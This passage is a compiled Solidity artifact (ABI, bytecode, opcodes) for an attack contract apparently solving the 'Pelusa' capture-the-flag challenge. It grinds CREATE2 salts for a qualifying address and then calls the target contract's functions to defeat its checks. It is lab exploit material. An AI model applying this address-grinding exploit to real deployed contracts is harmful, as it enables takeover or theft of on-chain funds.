{"contracts/deploy_attack_pelusa.sol":{"deployattackpelusa":{"abi":[{"inputs":[{"internalType":"address","name":"_pelusacontractaddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"attack_pelusacontract","outputs":[{"internalType":"contract attack_pelusa","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"attackpelusacontract","outputs":[{"internalType":"contract attack_pelusa","name":"","type":"address"}],"stateMutability":"view","type":"function"}],"evm":{"bytecode":{"linkReferences":{},"object":"608060405234801561001057600080fd5b50604051610d17380380610d1783398181016040528101906100329190610240565b6000610043826100c560201b60201c565b90508082604051610053906101d0565b61005d919061027c565b8190604051809103906000f590508015801561007d573d6000803e3d6000fd5b50600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610507565b600080600090506000604051806020016100de906101d0565b6020820181038252601f19601f8201166040525084604051602001610103919061027c565b604051602081830303815290604052604051602001610123929190610308565b6040516020818303038152906040528051906020012090505b6001156101c357600060ff60f81b308460001b8460405160200161016394939291906103ec565b604051602081830303815290604052805190602001209050600a60648260001c61018d9190610469565b73ffffffffffffffffffffffffffffffffffffffff16036101ae57506101c3565b6001836101bb91906104d3565b92505061013c565b8160001b92505050919050565b610670806106a783390190565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061020d826101e2565b9050919050565b61021d81610202565b811461022857600080fd5b50565b60008151905061023a81610214565b92915050565b600060208284031215610256576102556101dd565b5b60006102648482850161022b565b91505092915050565b61027681610202565b82525050565b6000602082019050610291600083018461026d565b92915050565b600081519050919050565b600081905092915050565b60005b838110156102cb5780820151818401526020810190506102b0565b60008484015250505050565b60006102e282610297565b6102ec81856102a2565b93506102fc8185602086016102ad565b80840191505092915050565b600061031482856102d7565b915061032082846102d7565b91508190509392505050565b60007fff0000000000000000000000000000000000000000000000000000000000000082169050919050565b6000819050919050565b61037361036e8261032c565b610358565b82525050565b60008160601b9050919050565b600061039182610379565b9050919050565b60006103a382610386565b9050919050565b6103bb6103b682610202565b610398565b82525050565b6000819050919050565b6000819050919050565b6103e66103e1826103c1565b6103cb565b82525050565b60006103f88287610362565b60018201915061040882866103aa565b60148201915061041882856103d5565b60208201915061042882846103d5565b60208201915081905095945050505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000610474826101e2565b915061047f836101e2565b92508261048f5761048e61043a565b5b828206905092915050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006104de8261049a565b91506104e98361049a565b9250828201905080821115610501576105006104a4565b5b92915050565b610191806105166000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80632b6658731461003b578063dd12a60f14610059575b600080fd5b610043610077565b6040516100509190610140565b60405180910390f35b61006161009d565b60405161006e9190610140565b60405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006101066101016100fc846100c1565b6100e1565b6100c1565b9050919050565b6000610118826100eb565b9050919050565b600061012a8261010d565b9050919050565b61013a8161011f565b82525050565b60006020820190506101556000830184610131565b9291505056fea264697066735822122009f14c7bb6abca9ba21567add4be960d406d7d95ee1d9e22219a61606966f13564736f6c63430008120033608060405234801561001057600080fd5b506040516106703803806106708339818101604052810190610032919061015e565b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a50883396040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100dd57600080fd5b505af11580156100f1573d6000803e3d6000fd5b505050505061018b565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061012b82610100565b9050919050565b61013b81610120565b811461014657600080fd5b50565b60008151905061015881610132565b92915050565b600060208284031215610174576101736100fb565b5b600061018284828501610149565b91505092915050565b6104d68061019a6000396000f3fe608060405234801561001057600080fd5b50600436106100625760003560e01c80630d8032fe1461006757806331e1785014610085578063478a4be5146100a15780638da5cb5b146100bf578063a067a24e146100dd578063e09235ad146100fb575b600080fd5b61006f610119565b60405161007c91906102b2565b60405180910390f35b61009f600480360381019061009a9190610330565b61012d565b005b6100a9610220565b6040516100b691906102b2565b60405180910390f35b6100c7610226565b6040516100d4919061036c565b60405180910390f35b6100e561024a565b6040516100f291906103e6565b60405180910390f35b610103610270565b604051610110919061036c565b60405180910390f35b60006002600181905550630150a3a2905090565b806000801b604051602001610143929190610474565b6040516020818303038152906040528051906020012060001c6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d95f98ce6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561020557600080fd5b505af1158015610219573d6000803e3d6000fd5b5050505050565b60015481565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6000819050919050565b6102ac81610299565b82525050565b60006020820190506102c760008301846102a3565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102fd826102d2565b9050919050565b61030d816102f2565b811461031857600080fd5b50565b60008135905061032a81610304565b92915050565b600060208284031215610346576103456102cd565b5b60006103548482850161031b565b91505092915050565b610366816102f2565b82525050565b6000602082019050610381600083018461035d565b92915050565b6000819050919050565b60006103ac6103a76103a2846102d2565b610387565b6102d2565b9050919050565b60006103be82610391565b9050919050565b60006103d0826103b3565b9050919050565b6103e0816103c5565b82525050565b60006020820190506103fb60008301846103d7565b92915050565b60008160601b9050919050565b600061041982610401565b9050919050565b600061042b8261040e565b9050919050565b61044361043e826102f2565b610420565b82525050565b6000819050919050565b6000819050919050565b61046e61046982610449565b610453565b82525050565b60006104808285610432565b601482019150610490828461045d565b602082019150819050939250505056fea2646970667358221220aeb83a7a73efc37af640eacdc385903885b85fde41b29581bc82ca9782e99d6d64736f6c63430008120033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xD17 CODESIZE SUB DUP1 PUSH2 0xD17 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x240 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x43 DUP3 PUSH2 0xC5 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP DUP1 DUP3 PUSH1 0x40 MLOAD PUSH2 0x53 SWAP1 PUSH2 0x1D0 JUMP JUMPDEST PUSH2 0x5D SWAP2 SWAP1 PUSH2 0x27C JUMP JUMPDEST DUP2 SWAP1 PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE2 SWAP1 POP DUP1 ISZERO DUP1 ISZERO PUSH2 0x7D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH2 0x507 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH2 0xDE SWAP1 PUSH2 0x1D0 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD DUP2 SUB DUP3 MSTORE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND PUSH1 0x40 MSTORE POP DUP5 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x103 SWAP2 SWAP1 PUSH2 0x27C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x123 SWAP3 SWAP2 SWAP1 PUSH2 0x308 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 SWAP1 POP JUMPDEST PUSH1 0x1 ISZERO PUSH2 0x1C3 JUMPI PUSH1 0x0 PUSH1 0xFF PUSH1 0xF8 SHL ADDRESS DUP5 PUSH1 0x0 SHL DUP5 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x163 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x3EC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 SWAP1 POP PUSH1 0xA PUSH1 0x64 DUP3 PUSH1 0x0 SHR PUSH2 0x18D SWAP2 SWAP1 PUSH2 0x469 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x1AE JUMPI POP PUSH2 0x1C3 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH2 0x1BB SWAP2 SWAP1 PUSH2 0x4D3 JUMP JUMPDEST SWAP3 POP POP PUSH2 0x13C JUMP JUMPDEST DUP2 PUSH1 0x0 SHL SWAP3 POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x670 DUP1 PUSH2 0x6A7 DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x20D DUP3 PUSH2 0x1E2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x21D DUP2 PUSH2 0x202 JUMP JUMPDEST DUP2 EQ PUSH2 0x228 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x23A DUP2 PUSH2 0x214 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x256 JUMPI PUSH2 0x255 PUSH2 0x1DD JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x264 DUP5 DUP3 DUP6 ADD PUSH2 0x22B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x276 DUP2 PUSH2 0x202 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x291 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x26D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2CB JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x2B0 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2E2 DUP3 PUSH2 0x297 JUMP JUMPDEST PUSH2 0x2EC DUP2 DUP6 PUSH2 0x2A2 JUMP JUMPDEST SWAP4 POP PUSH2 0x2FC DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x2AD JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x314 DUP3 DUP6 PUSH2 0x2D7 JUMP JUMPDEST SWAP2 POP PUSH2 0x320 DUP3 DUP5 PUSH2 0x2D7 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0xFF00000000000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x373 PUSH2 0x36E DUP3 PUSH2 0x32C JUMP JUMPDEST PUSH2 0x358 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x60 SHL SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x391 DUP3 PUSH2 0x379 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3A3 DUP3 PUSH2 0x386 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3BB PUSH2 0x3B6 DUP3 PUSH2 0x202 JUMP JUMPDEST PUSH2 0x398 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3E6 PUSH2 0x3E1 DUP3 PUSH2 0x3C1 JUMP JUMPDEST PUSH2 0x3CB JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3F8 DUP3 DUP8 PUSH2 0x362 JUMP JUMPDEST PUSH1 0x1 DUP3 ADD SWAP2 POP PUSH2 0x408 DUP3 DUP7 PUSH2 0x3AA JUMP JUMPDEST PUSH1 0x14 DUP3 ADD SWAP2 POP PUSH2 0x418 DUP3 DUP6 PUSH2 0x3D5 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH2 0x428 DUP3 DUP5 PUSH2 0x3D5 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP2 POP DUP2 SWAP1 POP SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x474 DUP3 PUSH2 0x1E2 JUMP JUMPDEST SWAP2 POP PUSH2 0x47F DUP4 PUSH2 0x1E2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x48F JUMPI PUSH2 0x48E PUSH2 0x43A JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x4DE DUP3 PUSH2 0x49A JUMP JUMPDEST SWAP2 POP PUSH2 0x4E9 DUP4 PUSH2 0x49A JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x501 JUMPI PUSH2 0x500 PUSH2 0x4A4 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x191 DUP1 PUSH2 0x516 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2B665873 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xDD12A60F EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x77 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x140 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x61 PUSH2 0x9D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6E SWAP2 SWAP1 PUSH2 0x140 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x106 PUSH2 0x101 PUSH2 0xFC DUP5 PUSH2 0xC1 JUMP JUMPDEST PUSH2 0xE1 JUMP JUMPDEST PUSH2 0xC1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x118 DUP3 PUSH2 0xEB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x12A DUP3 PUSH2 0x10D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x13A DUP2 PUSH2 0x11F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x155 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x131 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MULMOD CALL 0x4C PUSH28 0xB6ABCA9BA21567ADD4BE960D406D7D95EE1D9E22219A61606966F135 PUSH5 0x736F6C6343 STOP ADDMOD SLT STOP CALLER PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x670 CODESIZE SUB DUP1 PUSH2 0x670 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x15E JUMP JUMPDEST DUP1 PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA5088339 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xDD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xF1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH2 0x18B JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x12B DUP3 PUSH2 0x100 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x13B DUP2 PUSH2 0x120 JUMP JUMPDEST DUP2 EQ PUSH2 0x146 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x158 DUP2 PUSH2 0x132 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x174 JUMPI PUSH2 0x173 PUSH2 0xFB JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x182 DUP5 DUP3 DUP6 ADD PUSH2 0x149 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x4D6 DUP1 PUSH2 0x19A PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x62 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xD8032FE EQ PUSH2 0x67 JUMPI DUP1 PUSH4 0x31E17850 EQ PUSH2 0x85 JUMPI DUP1 PUSH4 0x478A4BE5 EQ PUSH2 0xA1 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xBF JUMPI DUP1 PUSH4 0xA067A24E EQ PUSH2 0xDD JUMPI DUP1 PUSH4 0xE09235AD EQ PUSH2 0xFB JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x6F PUSH2 0x119 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x7C SWAP2 SWAP1 PUSH2 0x2B2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x9F PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x9A SWAP2 SWAP1 PUSH2 0x330 JUMP JUMPDEST PUSH2 0x12D JUMP JUMPDEST STOP JUMPDEST PUSH2 0xA9 PUSH2 0x220 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xB6 SWAP2 SWAP1 PUSH2 0x2B2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC7 PUSH2 0x226 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xD4 SWAP2 SWAP1 PUSH2 0x36C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xE5 PUSH2 0x24A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xF2 SWAP2 SWAP1 PUSH2 0x3E6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x103 PUSH2 0x270 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x110 SWAP2 SWAP1 PUSH2 0x36C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH4 0x150A3A2 SWAP1 POP SWAP1 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 SHL PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x143 SWAP3 SWAP2 SWAP1 PUSH2 0x474 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 PUSH1 0x0 SHR PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD95F98CE PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x205 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x219 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2AC DUP2 PUSH2 0x299 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2C7 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2A3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2FD DUP3 PUSH2 0x2D2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x30D DUP2 PUSH2 0x2F2 JUMP JUMPDEST DUP2 EQ PUSH2 0x318 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x32A DUP2 PUSH2 0x304 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x346 JUMPI PUSH2 0x345 PUSH2 0x2CD JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x354 DUP5 DUP3 DUP6 ADD PUSH2 0x31B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x366 